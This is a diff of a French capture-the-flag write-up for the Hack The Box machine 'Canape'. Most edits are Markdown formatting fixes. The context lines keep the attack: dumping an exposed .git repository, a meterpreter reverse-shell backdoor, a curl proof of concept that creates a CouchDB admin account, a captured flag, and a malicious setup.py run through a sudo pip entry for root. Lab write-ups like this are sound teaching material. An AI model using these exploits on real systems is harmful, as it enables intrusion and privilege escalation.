@@ -78,11 +78,11 @@ Pour le reste le site web présent est un fan site des Simpsons qui collecte les
 
 Ni une ni deux on récupère le dépôt Git à l'aide de [dvcs-ripper](https://github.com/kost/dvcs-ripper) :  
 
-```
+```bash
 perl rip-git.pl -v -u http://10.10.10.70:80/.git/
 ```
 
-Une fois le dépôt dumpé on trouve du code Python/Flask dans le fichier *\_\_init\_\_.py* :  
+Une fois le dépôt dumpé on trouve du code Python/Flask dans le fichier `__init__.py` :  
 
 ```python
 import couchdb
@@ -256,9 +256,9 @@ with open("payload") as fd:
     print(response.status_code)
 ```
 
-On aura préalablement généré une backdoor via *msfvenom* (lors de la première exploitation ça a fonctionné sans problème avec un *linux/x64/meterpreter/reverse\_tcp* mais lors de l'écriture de l'article il a fallut sortir un *linux/x64/meterpreter\_reverse\_https*...)  
+On aura préalablement généré une backdoor via *msfvenom* (lors de la première exploitation ça a fonctionné sans problème avec un `linux/x64/meterpreter/reverse_tcp` mais lors de l'écriture de l'article il a fallu sortir un `linux/x64/meterpreter_reverse_https`...)  
 
-On obtient alors un shell en tant que *www-data*. Le module *exploit\_suggester* de Metasploit nous remonte un exploit potentiel mais ça s'avère être un faux positif :  
+On obtient alors un shell en tant que *www-data*. Le module `exploit_suggester` de Metasploit nous remonte un exploit potentiel mais ça s'avère être un faux positif :  
 
 ```
 [*] 10.10.10.70 - Collecting local exploits for x64/linux...
@@ -289,7 +289,7 @@ homer      3591  0.0  0.8  44788  8040 ?        Ssl  04:57   0:00 ./bin/couchjs 
 
 Vu que l'on ne voit rien d'autre côté disque, on jette un œil au *CouchDB* qui écoute en local. On peut commencer [par cette documentation sur 1and1](https://www.1and1.com/cloud-community/learn/database/couchdb/working-with-couchdb-from-the-command-line/) pour avoir quelques commandes et infos sur ce système de base NoSQL.  
 
-```
+```console
 $ curl http://127.0.0.1:5984
 {"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
 $ curl http://127.0.0.1:5984/_all_dbs
@@ -316,13 +316,13 @@ Cette version de *CouchDB* est vulnérable [à un exploit](https://justi.cz/secu
 
 On reprend le PoC curl pour créer notre compte privilégié :  
 
-```
+```bash
 curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:devloop' --data-binary '{"type": "user", "name": "devloop", "roles": ["_admin"], "roles": [], "password": "devloop31337"}'
 ```
 
 On peut dès lors accéder aux bases dont l’accès nous été auparavant refusé :  
 
-```
+```console
 $ curl http://127.0.0.1:5984/_users/_all_docs --basic -u devloop:devloop31337
 {"total_rows":7,"offset":0,"rows":[
 {"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-75efcce1f083316d622d389f3f9813f7"}},
@@ -335,7 +335,7 @@ $ curl http://127.0.0.1:5984/_users/_all_docs --basic -u devloop:devloop31337
 ]}
 ```
 
-La base *\_users* est une base interne mais pas la base *passwords* qui devrait contenir du contenu intéressant... Sauf qu'on ne voit que des métadonnées.  
+La base `_users` est une base interne, mais pas la base *passwords* qui devrait contenir du contenu intéressant... Sauf qu'on ne voit que des métadonnées.  
 
 J'ai passé 3 jours à essayer de comprendre ce que je faisais mal et à tenter d'exploiter en vain [une autre faille d'exécution de commande](https://www.exploit-db.com/exploits/44913/) qui aurait aussi pu toucher cette version sans résultats.  
 
@@ -370,11 +370,11 @@ Une fois activée, c'est mieux :')
   "password": "STOP STORING YOUR PASSWORDS HERE -Admin"
 ```
 
-Essentiellement c'est juste le pass SSH qui nous intéresse et permet alors de récupérer le compte homer et (enfin) son flag (*bce918696f293e62b2321703bb27288d*).  
+Essentiellement, c'est juste le pass SSH qui nous intéresse et permet alors de récupérer le compte homer et (enfin) son flag (*bce918696f293e62b2321703bb27288d*).  
 
 La suite est assez classique avec une entrée sudo à exploiter :  
 
-```bash
+```console
 homer@canape:~$ sudo -l
 [sudo] password for homer:
 Matching Defaults entries for homer on canape:
@@ -386,9 +386,9 @@ User homer may run the following commands on canape:
 
 [Une recherche rapide](https://groups.google.com/forum/#!msg/python-virtualenv/Z11FHJDYKEk/fnaQELGXCPoJ) nous indique que l'on peut spécifier un package local avec l'option -e qui doit correspondre à un dossier contenant un *setup.py*.  
 
-Il suffit de créer un *setup.py* qui réutilise notre *Meterpreter* :  
+Il suffit de créer un `setup.py` qui réutilise notre *Meterpreter* :  
 
-```bash
+```console
 homer@canape:~/.devloop$ cat mypackage/setup.py
 import os
 os.system("/tmp/devloop_meterpreter")
@@ -399,7 +399,7 @@ Obtaining file:///home/homer/.devloop/mypackage
 No files/directories in /home/homer/.devloop/mypackage (from PKG-INFO)
 ```
 
-Et pendant ce temps là, à une demi-heure de route de chez *Léonard de Vinci* :  
+Et pendant ce temps-là, à une demi-heure de route de chez *Léonard de Vinci* :  
 
 ```
 msf exploit(multi/handler) > [*] Sending stage (816260 bytes) to 10.10.10.70
